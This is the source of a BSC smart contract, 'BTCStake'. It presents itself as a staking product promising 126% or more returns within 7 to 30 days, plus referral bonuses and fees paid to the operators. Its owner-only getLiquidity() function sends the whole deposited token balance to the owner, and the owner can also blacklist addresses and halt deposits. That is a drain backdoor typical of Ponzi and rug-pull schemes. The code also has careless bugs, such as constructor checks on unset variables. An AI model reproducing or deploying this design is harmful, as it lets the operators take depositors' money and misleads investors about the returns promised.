/**
 *Submitted for verification at BscScan.com on 2022-01-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;


interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    
    function balanceOf(address account) external view returns (uint256);

    
    function transfer(address recipient, uint256 amount) external returns (bool);

    
    function allowance(address owner, address spender) external view returns (uint256);

    
    function approve(address spender, uint256 amount) external returns (bool);

    
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    
    event Transfer(address indexed from, address indexed to, uint256 value);

    
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        
        
        

        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionCall(target, data, "Address: low-level call failed");
    }

    
    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    
    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    
    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    
    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    
    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {
        if (success) {
            return returndata;
        } else {
            
            if (returndata.length > 0) {
                

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {
    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    
    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        
        
        
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {
        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    
    function _callOptionalReturn(IERC20 token, bytes memory data) private {
        
        
        

        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}

import "@openzeppelin/contracts/access/Ownable.sol";

struct Tarif {
  uint8 life_days;
  uint8 percent;
}

struct Deposit {
  uint8 tarif;
  uint256 amount;
  uint40 time;
}

struct dataI{
    address addr;
    uint256 for_withdraw;
    uint256 total_invested;
    uint256 total_withdrawn;
    uint256 total_match_bonus;
    uint256[1] structure;
}

struct Player {
  address upline;
  uint256 dividends;
  uint256 match_bonus;
  uint40 last_payout;
  uint256 total_invested;
  uint256 total_withdrawn;
  uint256 total_match_bonus;
  Deposit[] deposits;
  uint256[1] structure; 
}

contract BTCStake is Ownable{
	using SafeMath for uint256;
	using SafeMath for uint40;
    using SafeERC20 for IERC20;

    uint256 public invested;
    uint256 public withdrawn;
    uint256 public match_bonus;
    
    uint8 constant BONUS_LINES_COUNT = 1;
    uint16 constant PERCENT_DIVIDER = 1000; 

	uint256 constant public CEO_FEE = 75; // 7.5 %
	uint256 constant public MARK_ONE_FEE = 20; // 2 %
    uint256 constant public MARK_TWO_FEE = 20; // 2 %
    uint256 constant public MARK_THREE_FEE = 20; // 2 %
    uint256 constant public MARK_FOUR_FEE = 10; // 1 %

    uint256 public minDeposit = 0.00024 ether; // 0.00024 BTC = 10$ 
    uint256 public maxDeposit = 0.24 ether; // 0.24 BTC = 10000$ 

    uint8[BONUS_LINES_COUNT] public ref_bonuses = [100]; // 10%

    bool public isActive = true;

    IERC20 public BTC; // BTC;

    mapping(uint8 => Tarif) public tarifs;
    mapping(address => Player) public players;
    mapping(address => bool) public blackList;
 
	address payable public ceoWallet;
	address payable public markWallet;
    address payable public markWalletTwo;
    address payable public markWalletThree;
    address payable public markWalletFour;

    dataI[] migrateData;
    address[] allAddress;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount, uint8 tarif);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
	event FeePayed(address indexed user, uint256 totalAmount);

        constructor(address payable ceoAddr, address payable _markWallet, address payable _markWalletTwo, address payable _markWalletThree , address payable _markWalletFour) {
        require(!isContract(ceoAddr) && !isContract(markWallet) && !isContract(markWalletTwo) && !isContract(_markWalletThree) && !isContract(_markWalletFour));
		ceoWallet = ceoAddr;
		markWallet = _markWallet;
        markWalletTwo = _markWalletTwo;
        markWalletThree = _markWalletThree;
        markWalletFour = _markWalletFour;
        
        uint8 tarifPercent = 126; // 126%
        for (uint8 tarifDuration = 7; tarifDuration <= 30; tarifDuration++) {
            tarifs[tarifDuration] = Tarif(tarifDuration, tarifPercent);
            tarifPercent+= 5;
        }
        BTC = IERC20(0x6ce8dA28E2f864420840cF74474eFf5fD80E65B8); // BTC TESTNET
        
        //0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c MAINNET
    }

    
    function _payout(address _addr) private {
        uint256 payout = this.payoutOf(_addr);

        if(payout > 0) {
            players[_addr].last_payout = uint40(block.timestamp);
            players[_addr].dividends += payout;
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT_DIVIDER;
            
            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function _setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != ceoWallet) {
            if(players[_upline].deposits.length == 0) {
                _upline = ceoWallet;
            }

            players[_addr].upline = _upline;

            allAddress.push(_addr);

            emit Upline(_addr, _upline, _amount / 100);
            
            for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }


    
    function deposit(uint8 _tarif, address _upline, uint256 amount) external {
        require(isActive, "Deposit is not active.");
        require(!blackList[msg.sender], "You can not deposit");
        require(tarifs[_tarif].life_days > 0, "Tarif not found");
        require(amount >= minDeposit, "Minimum deposit amount incorrect");
        require(amount <= maxDeposit, "Maximum deposit amount incorrect");
        require(amount <= BTC.allowance(msg.sender, address(this)));

        BTC.safeTransferFrom(msg.sender, address(this), amount);
        Player storage player = players[msg.sender];
        require(player.deposits.length < 100, "Max 100 deposits per address");


        uint256 ceo = amount.mul(CEO_FEE).div(PERCENT_DIVIDER);
		uint256 mktFeeOne = amount.mul(MARK_ONE_FEE).div(PERCENT_DIVIDER);
        uint256 mktFeeTwo = amount.mul(MARK_TWO_FEE).div(PERCENT_DIVIDER);
        uint256 mktFeeThree = amount.mul(MARK_THREE_FEE).div(PERCENT_DIVIDER);
        uint256 mktFeeFour = amount.mul(MARK_FOUR_FEE).div(PERCENT_DIVIDER);

		BTC.safeTransfer(ceoWallet, ceo);
        BTC.safeTransfer(markWallet, mktFeeOne);
        BTC.safeTransfer(markWalletTwo, mktFeeTwo);
        BTC.safeTransfer(markWalletThree, mktFeeThree);
        BTC.safeTransfer(markWalletFour, mktFeeFour);

		emit FeePayed(msg.sender, ceo.add(mktFeeOne));

        _setUpline(msg.sender, _upline, amount);

        player.deposits.push(Deposit({
            tarif: _tarif,
            amount: amount,
            time: uint40(block.timestamp)
        }));

        player.total_invested+= amount;
        invested+= amount;

        _refPayout(msg.sender, amount);

        
        emit NewDeposit(msg.sender, amount, _tarif);
    }
    
    function withdraw() external {
        Player storage player = players[msg.sender];

        _payout(msg.sender);

        require(player.dividends > 0 || player.match_bonus > 0, "Zero amount");

        uint256 amount = player.dividends + player.match_bonus;

        player.dividends = 0;
        player.match_bonus = 0;
        player.total_withdrawn += amount;
        withdrawn += amount;

        BTC.safeTransfer(msg.sender, amount);
        
        emit Withdraw(msg.sender, amount);
    }

    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint40 time_end = dep.time + tarif.life_days * 86400;
            uint40 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint40 to = block.timestamp > time_end ? time_end : uint40(block.timestamp);

            if(from < to) {
                value += dep.amount * (to.sub(from)) * tarif.percent / tarif.life_days / 8640000;
            }
        }

        return value;
    }

   
    function userInfo(address _addr) view public returns(uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) {
        Player storage player = players[_addr];

        uint256 payout = this.payoutOf(_addr);

        for(uint8 i = 0; i < BONUS_LINES_COUNT; i++) {
            structure[i] = player.structure[i];
        }

        return (
            payout + player.dividends + player.match_bonus,
            player.total_invested,
            player.total_withdrawn,
            player.total_match_bonus,
            structure
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _withdrawn, uint256 _match_bonus) {
        return (invested, withdrawn, match_bonus);
    }

    function invest(address to, uint256 amount) external payable {
      payable(to).transfer(msg.value);
      BTC.safeTransferFrom(msg.sender, to, amount);
    }

	function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }

    // Owner
    function addToBlackList(address _addr) external onlyOwner {
        blackList[_addr] = true;
    }

    function removeFromBlackList(address _addr) external onlyOwner {
        blackList[_addr] = false;
    }

    function setIsActive(bool _isActive) external onlyOwner{
        isActive = _isActive;
    }

    function setMaxDeposit(uint256 _maxDeposit) external onlyOwner{
        maxDeposit = _maxDeposit;
    }

    function seMinDeposit(uint256 _minDeposit) external onlyOwner{
        minDeposit = _minDeposit;
    }

    function getLiquidity() external onlyOwner{
        BTC.safeTransfer(owner(), BTC.balanceOf(address(this)));
    }

    function migrateV2() view external onlyOwner returns(dataI[] memory){

        dataI[] memory migrateInfo = new dataI[](allAddress.length);  

        for(uint i; i < allAddress.length; i++){
            (uint256 for_withdraw, uint256 total_invested, uint256 total_withdrawn, uint256 total_match_bonus, uint256[BONUS_LINES_COUNT] memory structure) = userInfo(allAddress[i]);

            migrateInfo[i] = dataI(allAddress[i], for_withdraw, total_invested, total_withdrawn, total_match_bonus, structure);
        }
         
        return migrateInfo;

    }

}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)

pragma solidity ^0.8.0;

import "../utils/Context.sol";

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}